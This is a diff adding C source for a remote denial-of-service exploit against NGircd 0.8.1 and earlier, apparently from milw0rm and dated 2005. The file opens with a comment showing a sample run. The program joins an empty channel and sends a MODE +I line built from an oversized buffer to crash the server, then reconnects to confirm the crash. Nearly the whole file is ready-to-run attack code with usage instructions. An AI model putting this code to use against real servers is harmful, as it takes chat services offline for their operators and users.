@@ -1,0 +1,117 @@
+/* Ip under usage is actually port /str0ke */
+
+/* 
+-=[x0n3-h4ck]=--=[00:48:19]=--=[/root]=--=[Account: root]=-
+
+-=[#]  ./ngircd_dos x0n3-h4ck.org 12345 Angel DarkChan
+
+-=[ NGircd <= 0.8.1 Remote DoS ::: Coded by Expanders ]=-
+
+Connecting to target    ...[Done]
+Building evil buffer        ...[Done]
+Sending NICK               ...[Done]
+Sending USER               ...[Done]
+Joining Channel            ...[Done]
+Sending evil request    ...[Done]
+Trying to reconnect      ...[Done] -> Attack Success! Lets party!
+
+The Irc Server is Killed !!
+
+Exploit:
+
+     NGircd <= 0.8.1     Remote Denial Of Service       Coded by: Expanders
+
+     Usage:  ./ngircd_dos <Host> <Ip> <NickToUse> <ChannellToJoin>
+
+  NOTE:  The channel must be EMPTY to let the exploit use +I mode
+
+     Example:
+
+*/
+
+#include <stdio.h>
+#include <string.h>
+#include <netdb.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+void help(char *program_name);
+
+int main(int argc, char *argv[]) {
+    struct sockaddr_in trg;
+    struct hostent *he;
+long addr;
+    int sockfd, buff,rc;
+char evilbuf[1024];
+char buffer[1024];
+char *nick="AntiServer";
+char *channel="Die_NGircd";
+char *request;
+if(argv[3] != NULL) nick=argv[3];
+if(argv[4] != NULL) channel=argv[4];
+if(argc < 3 ) {
+ help(argv[0]);
+ exit(0);
+}
+printf("\n\n-=[ NGircd <= 0.8.1 Remote DoS ::: Coded by Expanders ]=-\n");
+    he = gethostbyname(argv[1]);
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    request = (char *) malloc(12344);
+    trg.sin_family = AF_INET;
+    trg.sin_port = htons(atoi(argv[2]));
+    trg.sin_addr = *((struct in_addr *) he->h_addr);
+    memset(&(trg.sin_zero), '\0', 8);
+printf("\n\nConnecting to target \t...");
+rc=connect(sockfd, (struct sockaddr *)&trg, sizeof(struct sockaddr_in));
+if(rc==0)
+{
+ printf("[Done]\nBuilding evil buffer\t...");
+ memset(evilbuf,65,300);
+ memset(evilbuf+300,64,1);
+ memset(evilbuf+301,65,128);
+ printf("[Done]\nSending NICK           \t...");
+ sprintf(request,"NICK %s\n",nick);
+ send(sockfd,request,strlen(request),0);
+ printf("[Done]\nSending USER           \t...");
+ sprintf(request,"USER %s x0n3-h4ck.org eth0.x0n3-h4ck.org
+:%s\n",nick,nick);
+ send(sockfd,request,strlen(request),0);
+ buff=recv(sockfd, buffer, 256, 0);
+ printf("[Done]\nJoining Channel        \t...");
+ sprintf(request,"JOIN #%s\n",channel);
+ send(sockfd,request,strlen(request),0);
+ printf("[Done]\nSending evil request   \t...");
+ sprintf(request,"MODE #%s +I %s\n",channel,evilbuf);
+ send(sockfd,request,strlen(request),0);
+ sprintf(request,"QUIT www.x0n3-h4ck.org\n",evilbuf);
+ send(sockfd,request,strlen(request),0);
+ sleep(2);
+ printf("[Done]\nTrying to reconnect\t...");
+ close(sockfd);
+ sockfd = socket(AF_INET, SOCK_STREAM, 0);
+ sleep(1);
+ rc=connect(sockfd, (struct sockaddr *)&trg, sizeof(struct sockaddr_in));
+ if(rc==0)
+  printf("[Fail] -> Damn! Attack Failed!\n\n");
+ else
+  printf("[Done] -> Attack Success! Lets party!\n\n");
+}
+else
+ printf("[Fail] -> Unable to connect\n\n");
+close(sockfd);
+return 0;
+
+}
+
+void help(char *program_name) {
+
+printf("\n\t-=[      NGircd <= 0.8.1 Remote Denial Of Service      ]=-\n");
+printf("\t-=[                                                    ]=-\n");
+printf("\t-=[      Coded by
+ders -/www.x0n3-h4ck.org\\-      ]=-\n\n");
+printf("Usage: %s <Host> <Ip> <NickToUse>
+<ChannellToJoin>\n",program_name);
+}
+
+// milw0rm.com [2005-02-05]
